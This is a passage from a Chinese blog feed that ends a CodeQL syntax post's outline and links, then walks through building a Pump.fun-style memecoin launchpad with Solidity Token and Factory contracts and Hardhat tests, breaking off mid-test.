href="https://codeql.github.com/docs/ql-language-reference/name-resolution/">名称解析</a>：QL 编译器将名称解析为程序元素。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/evaluation-of-ql-programs/">QL方案的评价</a>：以多个不同的步骤评估QL程序。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/ql-language-specification/">QL 语言规范</a>：QL语言的形式规范。它为术语，语法和有关QL的其他技术细节提供了全面的参考。</li></ul><h3 id="谓词Predicates">谓词Predicates</h3><p>官方文档<sup class="footnote-ref"><a href="#fn6" id="fnref6">[6]</a></sup></p><h3 id="查询Queries">查询Queries</h3><h3 id="类型Types">类型Types</h3><h3 id="模块Modules">模块Modules</h3><h3 id="别名Aliases">别名Aliases</h3><h3 id="变量Variables">变量Variables</h3><h3 id="表达式Expressions">表达式Expressions</h3><h3 id="公式Formulas">公式Formulas</h3><h3 id="注解Annotations">注解Annotations</h3><h3 id="名称解析Name-resolution">名称解析Name-resolution</h3><h3 id="QL语法规范QL-language-specification">QL语法规范QL-language-specification</h3><h2 id="静态分析Static-Analysis">静态分析Static Analysis</h2><h2 id="数据流分析Data-Flow-Analysis">数据流分析Data Flow Analysis</h2><h2 id="污点分析Taint-Analysis">污点分析Taint Analysis</h2><h2 id="常用的QL技巧查询技巧">常用的QL技巧查询技巧</h2><h3 id="抓取字符串正则">抓取字符串正则</h3><h3 id="Method-3">Method 3</h3><h2 id="参考">参考</h2><hr class="footnotes-sep"><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p><a href="https://codeql.github.com/docs/codeql-overview/supported-languages-and-frameworks/">https://codeql.github.com/docs/codeql-overview/supported-languages-and-frameworks/</a> ↩ <a href="#fnref1" class="footnote-backref">↩︎</a></p></li><li id="fn2" class="footnote-item"><p><a href="https://paper.seebug.org/1324/">https://paper.seebug.org/1324/</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p></li><li id="fn3" class="footnote-item"><p><a href="https://bbs.kanxue.com/article-20135.htm">https://bbs.kanxue.com/article-20135.htm</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p></li><li id="fn4" class="footnote-item"><p><a href="https://github.com/webraybtl/CodeQLpy">https://github.com/webraybtl/CodeQLpy</a> <a href="#fnref4" class="footnote-backref">↩︎</a></p></li><li id="fn5" class="footnote-item"><p><a href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a> <a href="#fnref5" class="footnote-backref">↩︎</a></p></li><li id="fn6" class="footnote-item"><p><a href="https://codeql.github.com/docs/ql-language-reference/predicates/">https://codeql.github.com/docs/ql-language-reference/predicates/</a> <a href="#fnref6" class="footnote-backref">↩︎</a></p></li></ol></section>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeQL </tag>
            
            <tag> QL语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>做个像Pump.fun一样的Memecoin启动台</title>
      <link href="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/"/>
      <url>/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="安装初始环境">安装初始环境</h2><p>安装<code>hardhat</code>，并配置node环境，我使用的<code>node</code>环境为<code>v22.13.0</code>。</p><p>下载github项目</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b starter_code https://github.com/dappuniversity/fun-pump</span><br></pre></td></tr></table></figure><p>进入到目录下<code>/FUN-PUMP</code>，使用<code>npm install</code>进行安装</p><h2 id="创建Token">创建Token</h2><p>使用<code>ERC20.sol</code>创建<code>token</code>，参考<code>openzeppelin</code>。</p><p>使用到<code>Remix</code>去编写<code>token</code>的solidity，<code>Token.sol</code>的代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 0.8.27;</span><br><span class="line"></span><br><span class="line">import &#123;ERC20&#125; from &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Token is ERC20 &#123;</span><br><span class="line">    address payable public owner;</span><br><span class="line">    address public creator;</span><br><span class="line"></span><br><span class="line">    constructor(</span><br><span class="line">        address _creator,</span><br><span class="line">        string memory _name,</span><br><span class="line">        string memory _symbol,</span><br><span class="line">        uint256 _totalSupply</span><br><span class="line">    ) ERC20(_name, _symbol) &#123;</span><br><span class="line">        owner = payable(msg.sender);</span><br><span class="line">        creator = _creator;</span><br><span class="line"></span><br><span class="line">        _mint(msg.sender, _totalSupply);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码中变量：</p><ul><li><code>_creator</code>：代币创建者的地址。</li><li><code>_name</code>：代币名称（例如 “My Token”）。</li><li><code>_symbol</code>：代币符号（例如 “MTK”）。</li><li><code>_totalSupply</code>：要铸造的代币总量。</li></ul><p><code>owner = payable(msg.sender);</code> 的含义：</p><ul><li><code>msg.sender</code> 是调用当前函数的地址。</li><li><code>payable(msg.sender)</code> 将地址转换为可支付类型，意味着这个地址可以接收ETH。</li><li>在这里，<code>owner</code> 被设置为部署 <code>Token</code> 合约的地址（<code>Factory</code> 合约），并且可以接收ETH。</li><li>使用 <code>_mint()</code> 将全部 <code>_totalSupply</code> 铸造给合约部署者。</li></ul><p>先使用<code>Remix</code>去部署测试，再使用<code>hardhat</code>在本地部署。</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250207190149258.png" alt="image-20250207190149258"></p><p>部署成功。</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/Snipaste_2025-02-07_19-03-39.png" alt="Snipaste_2025-02-07_19-03-39"></p><h2 id="创建并测试Factory">创建并测试Factory</h2><p>整个<code>Meme Coin</code>启动台的逻辑如下图：</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250216005120396.png" alt="image-20250216005120396"></p><h3 id="全局变量">全局变量</h3><p>全局变量如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">uint256 public constant TARGET = 3 ether;</span><br><span class="line">uint256 public constant TOKEN_LIMIT = 500_000 ether;</span><br><span class="line">//交易费费用</span><br><span class="line">uint256 public immutable fee;</span><br><span class="line">//合约的部署者</span><br><span class="line">address public owner;</span><br><span class="line">//token数组</span><br><span class="line">address[] public tokens;</span><br><span class="line">//token总共的数量</span><br><span class="line">uint256 public totalTokens;</span><br><span class="line"></span><br><span class="line">//将token的地址映射到token售卖信息的结构体上</span><br><span class="line">mapping(address =&gt; TokenSale) public tokenToSale;</span><br><span class="line">//创建一个售卖token的结构体</span><br><span class="line">struct TokenSale&#123;</span><br><span class="line">    address token;</span><br><span class="line">    string name;</span><br><span class="line">    address creator;</span><br><span class="line">    uint256 sold;</span><br><span class="line">    uint256 raised;</span><br><span class="line">    bool isOpen;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中创建了一个<code>token</code>的结构体，其中</p><ul><li><code>token</code>表示创建的token地址</li><li><code>name</code>代表token的名称</li><li><code>creator</code>表示token的创造者</li><li><code>sold</code>表示售卖的token数量</li><li><code>raised</code>表示token已经筹资了多少</li><li><code>isOpen</code>表示token是否公开售卖</li></ul><p>同时还创建了两个事件，分别为<code>Created</code>和<code>Buy</code>事件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//当创建一个token时，发生了一个Created事件</span><br><span class="line">event Created(address indexed token);</span><br><span class="line">//当购买一个token时，发生一个Buy事件</span><br><span class="line">event Buy(address indexed token, uint256 amount);</span><br></pre></td></tr></table></figure><p>在<code>Solidity</code>中，<code>event</code>（事件）用于记录和通知区块链上发生的特定操作。事件不会改变合约的状态，且可以被外部系统廉价地存储和检索，比直接返回值更节省<code>gas</code>。在代码中，<code>indexed</code>是<code>Solidity</code>中的一个特殊关键字，主要用于优化事件的检索和过滤。被<code>indexed</code>标记的参数会创建<code>topics</code>（主题），便于快速查询。</p><h3 id="Create函数-代币创建">Create函数(代币创建)</h3><h4 id="函数代码">函数代码</h4><p><code>Solidity</code>代码详细如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function create(string memory _name, string memory _symbol) external payable &#123;</span><br><span class="line">    //确保创建者的余额大于fee，否则报错不向下继续执行。</span><br><span class="line">    require(msg.value &gt;= fee, &quot;Factory: Creator fee not met&quot;);</span><br><span class="line"></span><br><span class="line">    //创建一个token</span><br><span class="line">    Token token = new Token(msg.sender, _name, _symbol, 1000000 ether);</span><br><span class="line">    //tokens数组存储token</span><br><span class="line">    tokens.push(address(token));</span><br><span class="line">    //token计数</span><br><span class="line">    totalTokens ++;</span><br><span class="line">    //列出用于售卖的token</span><br><span class="line">    // address token;</span><br><span class="line">    // string name;</span><br><span class="line">    // address creator;</span><br><span class="line">    // uint256 sold;</span><br><span class="line">    // uint256 raised;</span><br><span class="line">    // bool isOpen;</span><br><span class="line">    TokenSale memory sale = TokenSale(address(token),_name,msg.sender,0,0,true);</span><br><span class="line"></span><br><span class="line">    tokenToSale[address(token)] = sale;</span><br><span class="line">    //tell people it&#x27;s a live</span><br><span class="line">    emit Created(address(token));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，传入的参数<code>_name</code>为<code>token</code>的名称，<code>_symbol</code>为<code>token</code>的符号。通过<code>require</code>判断创建者的资金是否大于<code>fee</code>，满足条件后才能创建<code>token</code>。</p><p>其次，创建<code>token</code>，给Token必要的参数，<code>msg.sender</code>为调用<code>create</code>函数的地址，<strong>这里为<code>factory</code>合约的地址</strong>，其为Token的创建者，<code>_name</code>为Token的名称，<code>_symbol</code>为Token的符号，<code>1000000 ether</code>为token的总供应量。</p><p>然后，将创建的<code>token</code>保存到已创建的<code>token</code>数组中，并计数创建的<code>token</code>数量。</p><p>再者，创建一个<code>TokenSale</code>结构体，用于记录<code>token</code>的售卖情况，初始化存入<code>token</code>的地址、名称和创建者地址，初始<code>token</code>的售卖量和筹资量均为0，售卖状态是打开的。</p><p>最后，使用到<code>mapping</code>，使得<code>token</code>的地址直接映射到<code>token</code>的售卖信息(<code>tokenSale</code>)上。同时，每创建一个新的<code>token</code>都会创建一个<code>Created</code>事件。</p><h4 id="合约测试">合约测试</h4><p>js代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; loadFixture &#125; = <span class="built_in">require</span>(<span class="string">&quot;@nomicfoundation/hardhat-toolbox/network-helpers&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> &#123; expect &#125; = <span class="built_in">require</span>(<span class="string">&quot;chai&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">&quot;hardhat&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="title function_">describe</span>(<span class="string">&quot;Factory&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">FEE</span> = ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;0.01&quot;</span>, <span class="number">18</span>);</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">deployFactoryFixture</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">//获取账户</span></span><br><span class="line">        <span class="keyword">const</span> [deployer, creator, buyer] = <span class="keyword">await</span> ethers.<span class="title function_">getSigners</span>();</span><br><span class="line">        <span class="comment">//编译并准备部署合约</span></span><br><span class="line">        <span class="keyword">const</span> <span class="title class_">Factory</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;Factory&quot;</span>);</span><br><span class="line">        <span class="comment">//部署合约</span></span><br><span class="line">      <span class="comment">//默认是第一个用户部署合约即deployer</span></span><br><span class="line">      <span class="comment">//await Factory.connect(deployer).deploy(FEE);</span></span><br><span class="line">        <span class="keyword">const</span> factory = <span class="keyword">await</span> <span class="title class_">Factory</span>.<span class="title function_">deploy</span>(<span class="variable constant_">FEE</span>);</span><br><span class="line">        <span class="comment">//创建token</span></span><br><span class="line">        <span class="keyword">const</span> transaction = <span class="keyword">await</span> factory.<span class="title function_">connect</span>(creator).<span class="title function_">create</span>(<span class="string">&quot;Pump&quot;</span>, <span class="string">&quot;PUM&quot;</span>, &#123;<span class="attr">value</span>: <span class="variable constant_">FEE</span>&#125;);</span><br><span class="line">        <span class="comment">//确保交易完成，再执行后续代码</span></span><br><span class="line">        <span class="keyword">await</span> transaction.<span class="title function_">wait</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取第一个token，tokens为token数组</span></span><br><span class="line">        <span class="keyword">const</span> tokenAddress = <span class="keyword">await</span> factory.<span class="title function_">tokens</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">const</span> token = <span class="keyword">await</span> ethers.<span class="title function_">getContractAt</span>(<span class="string">&quot;Token&quot;</span>, tokenAddress);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &#123; factory, token, deployer, creator ,buyer&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">describe</span>(<span class="string">&quot;Deployment&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should set the fee&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; factory &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(deployFactoryFixture);</span><br><span class="line">            <span class="title function_">expect</span>(<span class="keyword">await</span> factory.<span class="title function_">fee</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="variable constant_">FEE</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should set the owner&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; factory,deployer &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(deployFactoryFixture);</span><br><span class="line">            <span class="title function_">expect</span>(<span class="keyword">await</span> factory.<span class="title function_">owner</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(deployer.<span class="property">address</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="title function_">describe</span>(<span class="string">&quot;Creating&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should set the owner&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; factory,token &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(deployFactoryFixture);</span><br><span class="line">            <span class="title function_">expect</span>(<span class="keyword">await</span> token.<span class="title function_">owner</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="keyword">await</span> factory.<span class="title function_">getAddress</span>());</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should set the creator&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; token,creator &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(deployFactoryFixture);</span><br><span class="line">            <span class="title function_">expect</span>(<span class="keyword">await</span> token.<span class="title function_">creator</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(creator.<span class="property">address</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should set the supply&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; factory,token &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(deployFactoryFixture);</span><br><span class="line">            <span class="keyword">const</span> totalSupply = ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;1000000&quot;</span>, <span class="number">18</span>);</span><br><span class="line">            <span class="title function_">expect</span>(<span class="keyword">await</span> token.<span class="title function_">balanceOf</span>(<span class="keyword">await</span> factory.<span class="title function_">getAddress</span>())).<span class="property">to</span>.<span class="title function_">equal</span>(totalSupply);</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should update ETH balance&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; factory &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(deployFactoryFixture);</span><br><span class="line">            <span class="keyword">const</span> balance = <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBalance</span>(<span class="keyword">await</span> factory.<span class="title function_">getAddress</span>());</span><br><span class="line">            <span class="title function_">expect</span>(balance).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="variable constant_">FEE</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should create the sale&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; factory,token,creator&#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(deployFactoryFixture);</span><br><span class="line">            <span class="keyword">const</span>  count = <span class="keyword">await</span> factory.<span class="title function_">totalTokens</span>();</span><br><span class="line">            <span class="title function_">expect</span>(count).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">const</span> sale = <span class="keyword">await</span> factory.<span class="title function_">getTokenSale</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="comment">//console.log(sale);</span></span><br><span class="line"></span><br><span class="line">            <span class="title function_">expect</span>(sale.<span class="property">token</span>).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="keyword">await</span> token.<span class="title function_">getAddress</span>());</span><br><span class="line">            <span class="title function_">expect</span>(sale.<span class="property">creator</span>).<span class="property">to</span>.<span class="title function_">equal</span>(creator.<span class="property">address</span>);</span><br><span class="line">            <span class="title function_">expect</span>(sale.<span class="property">sold</span>).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="title function_">expect</span>(sale.<span class="property">raised</span>).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="title function_">expect</span>(sale.<span class="property">isOpen</span>).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="literal">true</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>测试合约的部署，对于<code>deployFactoryFixture</code>函数：</p><p>使用<code>ethers.getSigners()</code>去获取用户，<code>deployer、creator</code>分别为合约的部署者和创建者，<code>buyer</code>为token的买家。编译并部署合约，用<code>creator</code>用户去交易，创建一个名称为<code>Pump</code>，符号为<code>PUM</code>的代币(<code>token</code>)。然后，获取创建的<code>token</code>的地址。</p><p>部署部分测试：</p><p>测试部署的合约的<code>fee</code>和<code>deployer</code>是否正确。<code>Factory.deploy(FEE);</code>默认是使用第一个用户去部署合约，正常应该是<code>Factory.connect(deployer).deploy(FEE);</code>去部署合约。</p><p>创建<code>token</code>部分测试：</p><p>（1）测试<code>token.owner()</code>和<code>factory.getAddress()</code>是否相等。<code>token.owner()</code>是<code>token</code>的创建者，<code>factory.getAddress()</code>是<code>factory</code>合约部署的地址，因为在<code>Token.sol</code>中，创建<code>token</code>时，使用的是<code>msg.sender</code>，即调用该合约的地址，其被赋值给了<code>owner</code>，<code>Factory</code>合约调用了<code>Token</code>合约，所以二者是相等。</p><p>（2）测试<code>creator</code>和<code>totalSupply</code>是否和部署时一致。</p><p>（3）创建<code>token</code>时需要支付一定的<code>fee</code>，这个<code>fee</code>是存储在<code>factory</code>合约中的，创建<code>token</code>后判断合约中的余额和<code>fee</code>是否相等。</p><p>（4）测试<code>token</code>的售卖信息。</p><p>测试完成。</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250216175651190.png" alt="image-20250216175651190"></p><h3 id="Buy函数-代币销售">Buy函数(代币销售)</h3><h4 id="函数代码-2">函数代码</h4><p>代码详细如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">function buy(address _token, uint256 _amount) external payable&#123;</span><br><span class="line">    TokenSale storage sale = tokenToSale[_token];</span><br><span class="line">    //检查条件</span><br><span class="line">    require(sale.isOpen == true, &quot;Factory: Buying closed&quot;);</span><br><span class="line">    require(_amount &gt;= 1 ether, &quot;Factory: Amount too low&quot;);</span><br><span class="line">    require(_amount &lt;= 10000 ether, &quot;Factory: Amount exceeded&quot;);</span><br><span class="line"></span><br><span class="line">    //计算一个token的价格基于购买的总量</span><br><span class="line">    uint256 cost = getCost(sale.sold);</span><br><span class="line">    uint256 price = cost * (_amount / 10 ** 18);</span><br><span class="line">    //确保足够的ETH发送</span><br><span class="line">    require(msg.value &gt;= price, &quot;Factory: Insufficient ETH received&quot;);</span><br><span class="line">    //更新sale</span><br><span class="line">    sale.sold += _amount;</span><br><span class="line">    sale.raised += price;</span><br><span class="line">    //判断筹集目标是否达成</span><br><span class="line">    if(sale.sold &gt;= TOKEN_LIMIT || sale.raised &gt;= TARGET)&#123;</span><br><span class="line">        //关闭销售</span><br><span class="line">        sale.isOpen = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Token(_token).transfer(msg.sender, _amount);</span><br><span class="line">    //触发Buy事件</span><br><span class="line">    emit Buy(_token, _amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数为<code>external payable</code>的，说明只能外部调用且是可以在调用时发送<code>ETH</code>的。函数传入的参数为<code>_token</code>和<code>_amount</code>，即<code>token</code>的地址和购买的数量。</p><p>首先，使用 <code>storage</code> 关键字，允许直接修改存储状态，并通过<code>token</code>的地址获取对应的售卖信息。然后检查<code>token</code>的售卖信息是否符合情况。</p><p>然后，根据<code>token</code>的售卖情况计算<code>token</code>的价格。使用到了<code>getCost</code>函数，自己定义的函数，具体如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function getCost(uint256 _sold) public pure returns (uint256)&#123;</span><br><span class="line">    uint256 floor = 0.0001 ether;</span><br><span class="line">    uint256 step = 0.0001 ether;</span><br><span class="line">    uint256 increment = 10000 ether;</span><br><span class="line">    uint256 cost = (step * (_sold / increment)) + floor;</span><br><span class="line">    return cost;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其次，判断购买者的资金是否大于价格，若满足，则可购买，然后更新<code>token</code>的售卖信息，购买量和筹集的资金均增加。更新后，判断<code>token</code>的售卖信息是否达到上限的要求，若满足，则关闭售卖状态。</p><p>最后，向购买者<code>buyer</code>转账购买的<code>token</code>。转账完成后触发<code>Buy</code>事件。</p><h4 id="合约测试-2">合约测试</h4><p>js代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">buyTokenFixture</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; factory, token, creator , buyer &#125; = <span class="keyword">await</span> <span class="title function_">deployFactoryFixture</span>();</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">AMOUNT</span> = ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;10000&quot;</span>, <span class="number">18</span>);</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">COST</span> = ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;1&quot;</span>, <span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//买token</span></span><br><span class="line">    <span class="keyword">const</span> transaction = <span 